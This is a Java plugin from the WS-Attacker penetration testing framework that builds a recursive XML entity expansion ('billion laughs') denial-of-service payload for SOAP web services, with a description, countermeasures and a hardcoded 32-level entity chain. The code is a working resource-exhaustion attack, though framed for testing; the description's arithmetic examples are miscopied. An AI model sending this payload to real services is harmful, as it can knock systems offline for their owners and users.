/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;



import org.apache.xmlbeans.XmlException;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;

import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.composition.plugin.option.AbstractOptionBoolean;
import wsattacker.main.composition.plugin.option.AbstractOptionChoice;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.main.testsuite.TestSuite;
import wsattacker.util.SoapUtilities;
import wsattacker.util.SortedUniqueList;

import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import wsattacker.plugin.dos.dosExtension.mvc.AttackMVC;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;
import org.w3c.dom.Element;
import wsattacker.main.composition.plugin.PluginFunctionInterface;
import wsattacker.main.plugin.option.OptionSimpleText;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX31A;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX33A;
import wsattacker.plugin.dos.dosExtension.function.postanalyze.DOSPostAnalyzeFunction;
import wsattacker.plugin.dos.dosExtension.mvc.model.AttackModel;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
import wsattacker.plugin.dos.dosExtension.util.UtilDos;

public class XmlEntityExpansion extends AbstractDosPlugin {
	
    private static final long serialVersionUID = 1L;

    // Custom Attributes
    private AbstractOptionInteger optionExponent;

    @Override 
    public void initializeDosPlugin() {

	// Custom Initilisation
	optionExponent =  new OptionLimitedInteger("Param 8", 20, "Exponent for calculating the number of entities (total entities = 2^Param8)", 1, 200);	
	getPluginOptions().add(optionExponent);
    }	

    @Override 
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition(){
	return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENTATTRIBUTES;
    }  	 	

    @Override
    public String getName() {
	    return "XML Entity Expansion (recursive)";
    }

    @Override
    public String getDescription() {
	    return "This attack checks whether or not a Web service is vulnerable to the \"XML Entity Expansion\" attack.\n"
		    + "A vulnerable Web service runs out of resources when trying to resolve a large amount of recursively defined entities.\n"
		    + "The entities are defined in the Document Type Definition (DTD)\n"
		    + "A detailed description of the attack can be found here: http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion"
		    + "\n\n"
		    + "The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below \n"
		    + "with an attribute that uses an entity that will start the recursive process.\n"
		    + "The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message"	    		
		    + "\n\n"
		    + "Parameter 8 defines the exponent that is used for calculating the number of resulting XML entities. "
		    + "The base is 2.\n"
		    + "- Input 10 will result in  2^10 = 1024 entities."
		    + "- Input 15 will result in  2^10 = 32768 entities."
		    + "- Input 20 will result in  2^10 = 1048576 entities."
		    + "- Input 25 will result in  2^10 = 33554432 entities."
		    + "\n\n";
    }

    @Override
    public String getCountermeasures(){
      return "In order to counter the attack, the DTD-processing (Document Type Definitions) feature has to be disabled completly.\n"
	      + "Apache Axis2 1.5.2 is known to be vulnerable to this attack. Current versions of Apache Axis2 are not vulnerable anymore";
    }        

    @Override
    public String getAuthor() {
	    return "Andreas Falkenberg";
    }

    @Override
    public String getVersion() {
	    return "1.0 / 2012-12-31";
    }

    @Override
    public void createTamperedRequest(){

	// get Message 
	String soapMessageFinal;
	String soapMessage = this.getOptionTextAreaSoapMessage().getValue();

	// inset payload entity in envelope
	String attribute =  "entityAttack=\"&x1;\"";
	soapMessage =  this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload(soapMessage, attribute);

	// prepend DTD to message
//	StringBuilder sb = new StringBuilder();
//	sb.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
//	sb.append("<!DOCTYPE Envelope [");
//	sb.append("<!ENTITY x"+optionExponent.getValue()+" \"Fo\">");
//	for (int i = 1; i < optionExponent.getValue(); i++) { 
//	    sb.append("<!ENTITY x"+(optionExponent.getValue()-i)+" \"&x"+(optionExponent.getValue()-i+1)+";&x"+(optionExponent.getValue()-i+1)+";\">");
//	}
//	sb.append("]>");
//	sb.append(soapMessage);
//	sb.append("\r\n\r\n");
//	soapMessageFinal = sb.toString();
	
	StringBuilder sb = new StringBuilder();	
	sb.append("<!DOCTYPE root [");
	sb.append("<!ENTITY x32 \"foobar\">");
	sb.append("<!ENTITY x31 \"&x32;&x32;\">");
	sb.append("<!ENTITY x30 \"&x31;&x31;\">");
	sb.append("<!ENTITY x29 \"&x30;&x30;\">");
	sb.append("<!ENTITY x28 \"&x29;&x29;\">");
	sb.append("<!ENTITY x27 \"&x28;&x28;\">");
	sb.append("<!ENTITY x26 \"&x27;&x27;\">");
	sb.append("<!ENTITY x25 \"&x26;&x26;\">");
	sb.append("<!ENTITY x24 \"&x25;&x25;\">");
	sb.append("<!ENTITY x23 \"&x24;&x24;\">");
	sb.append("<!ENTITY x22 \"&x23;&x23;\">");
	sb.append("<!ENTITY x21 \"&x22;&x22;\">");
	sb.append("<!ENTITY x20 \"&x21;&x21;\">");
	sb.append("<!ENTITY x19 \"&x20;&x20;\">");
	sb.append("<!ENTITY x18 \"&x19;&x19;\">");
	sb.append("<!ENTITY x17 \"&x18;&x18;\">");
	sb.append("<!ENTITY x16 \"&x17;&x17;\">");
	sb.append("<!ENTITY x15 \"&x16;&x16;\">");
	sb.append("<!ENTITY x14 \"&x15;&x15;\">");
	sb.append("<!ENTITY x13 \"&x14;&x14;\">");
	sb.append("<!ENTITY x12 \"&x13;&x13;\">");
	sb.append("<!ENTITY x11 \"&x12;&x12;\">");
	sb.append("<!ENTITY x10 \"&x11;&x11;\">");
	sb.append("<!ENTITY x9 \"&x10;&x10;\">");
	sb.append("<!ENTITY x8 \"&x9;&x9;\">");
	sb.append("<!ENTITY x7 \"&x8;&x8;\">");
	sb.append("<!ENTITY x6 \"&x7;&x7;\">");
	sb.append("<!ENTITY x5 \"&x6;&x6;\">");
	sb.append("<!ENTITY x4 \"&x5;&x5;\">");
	sb.append("<!ENTITY x3 \"&x4;&x4;\">");
	sb.append("<!ENTITY x2 \"&x3;&x3;\">");
	sb.append("<!ENTITY x1 \"&x2;&x2;\">");
	sb.append("]>");
	sb.append("root attr=\"&x1;\"/>"); // \r\n\r\n	
	soapMessageFinal = sb.toString();

	// get HeaderFields from original request, if required add custom headers - make sure to clone!
	Map<String, String> httpHeaderMap = new HashMap<String, String>();
	for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
	    httpHeaderMap.put(entry.getKey(), entry.getValue());
	}
	httpHeaderMap.put("Content-Type", "application/xml; charset=UTF-8"); //; charset=UTF-8"


	// write payload and header to TamperedRequestObject	    
	this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal);

    }


    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below! 
    // ----------------------------------------------------------
	
}
